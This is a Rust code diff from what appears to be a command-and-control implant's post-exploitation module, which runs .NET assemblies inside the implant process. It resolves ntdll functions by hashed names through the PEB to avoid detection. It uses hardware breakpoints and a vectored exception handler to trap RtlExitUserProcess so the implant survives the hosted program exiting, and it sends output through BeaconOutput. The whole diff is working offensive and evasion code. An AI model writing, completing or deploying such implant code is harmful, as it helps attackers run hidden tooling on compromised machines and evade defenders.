@@ -265,31 +265,42 @@ unsafe fn orchestrate_internal(
             dlog(input, b"[orch]   pipe_ready_hook returned");
         }
 
-        // Capture the cleanup point for the exit-trap (re-entry after
-        // Environment.Exit). The trap is installed below before dispatch.
+        // Resolve RtlExitUserProcess once; needed for both install_exit_trap
+        // (path A) and cleanup on path B.
+        let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
+        let exit_h  = opsec_strcrypt::hash!("RtlExitUserProcess");
+        let exit_target = opsec_peb::resolve_module(ntdll_h)
+            .and_then(|m| opsec_peb::resolve_export(m, exit_h))
+            .ok_or(OrchestratorError::PebResolve {
+                module_hash: ntdll_h,
+                export_hash: exit_h,
+            })? as usize;
+
+        // Reset the fired flag before capturing the cleanup point so a
+        // stale value from a previous run never masks path A.
+        opsec_hwbp::EXIT_TRAP_FIRED.store(0, core::sync::atomic::Ordering::Relaxed);
+
+        // Capture the resume point for the exit-trap.
+        //
+        // Two paths land after save_cleanup_point() returns:
+        //   A. First entry  — EXIT_TRAP_FIRED == 0: dispatch the assembly.
+        //   B. Re-entry via VEH ExitTrap redirect — EXIT_TRAP_FIRED == 1:
+        //      the VEH already removed the TABLE entry and cleared the DR
+        //      in the faulting thread's CONTEXT.  Skip dispatch entirely;
+        //      fall through to the trailing drain so the streamer can EOF.
         dlog(input, b"[orch] save_cleanup_point");
         let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
+
+        // Read-and-clear atomically so nested/reentrant calls don't bleed.
+        let exit_trap_fired =
+            opsec_hwbp::EXIT_TRAP_FIRED.swap(0, core::sync::atomic::Ordering::Relaxed) != 0;
         dlog(input, b"[orch]   cleanup point saved");
-        // Two paths land here:
-        //   A. First entry: dispatch the assembly, then drain.
-        //   B. Re-entry from RtlExitUserProcess exit-trap: dispatch_result?
-        //      unwound via the cleanup-RIP/RSP rewrite; we resume here for
-        //      a final drain.
-        // Path A executes the dispatch block; path B falls through to the
-        // trailing drain.
-        {
-            // Install the exit-trap on RtlExitUserProcess (slot 2).
-            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
-            let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
-            let exit_target = opsec_peb::resolve_module(ntdll_h)
-                .and_then(|m| opsec_peb::resolve_export(m, exit_h))
-                .ok_or(OrchestratorError::PebResolve {
-                    module_hash: ntdll_h,
-                    export_hash: exit_h,
-                })?;
+
+        if !exit_trap_fired {
+            // ── PATH A: first entry ──────────────────────────────────────
             dlog(input, b"[orch] install_exit_trap");
             let _exit_trap = engine
-                .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
+                .install_exit_trap(exit_target, 2, resume_rip, resume_rsp)
                 .map_err(OrchestratorError::Hwbp)?;
             dlog(input, b"[orch]   exit_trap installed");
 
@@ -306,15 +317,11 @@ unsafe fn orchestrate_internal(
             );
             dlog(input, b"[orch]   dispatch returned");
 
-            dlog(input, b"[orch] (about to leave inner block; exit_trap will drop)");
+            // _exit_trap drops here → removes descriptor + clears DR (normal return).
+            dlog(input, b"[orch] inner block exiting (exit_trap will drop)");
 
-            // Path A: assembly Main returned normally.
             #[cfg(feature = "debug-io")]
             io_ch.diag_write(b"\n[RUST_END]\n");
-            // Inline mode: drain the pipe and emit via BeaconOutput.
-            // Streaming mode: the caller's reader thread is already
-            // draining; we just let `io_ch.drop` close the write end at
-            // function exit so the streamer observes ERROR_BROKEN_PIPE.
             if !streaming {
                 if let Ok(output) = io_ch.drain() {
                     if !output.is_empty() {
@@ -323,11 +330,18 @@ unsafe fn orchestrate_internal(
                 }
             }
             dispatch_result?;
+        } else {
+            // ── PATH B: exit-trap re-entry ───────────────────────────────
+            // VEH cleared the TABLE entry and the firing thread's DR.
+            // Clear remaining threads' DRs for slot 2 so postex_exit →
+            // ExitProcess → RtlExitUserProcess doesn't re-trigger a stale BP.
+            dlog(input, b"[orch] path B: exit-trap re-entry, cleaning up DR slot 2");
+            engine.remove_breakpoint(exit_target, 2);
         }
-        dlog(input, b"[orch] inner block exited (exit_trap dropped)");
-        // Trailing drain — covers path B (no-op for path A, which already
-        // drained). Streaming mode skips entirely; the reader thread sees
-        // EOF when this function returns and `io_ch` is dropped.
+
+        dlog(input, b"[orch] trailing drain");
+        // Trailing drain: path B lands here (no-op for streaming; the
+        // streamer sees EOF when io_ch drops at function exit).
         if !streaming {
             if let Ok(output) = io_ch.drain() {
                 if !output.is_empty() {
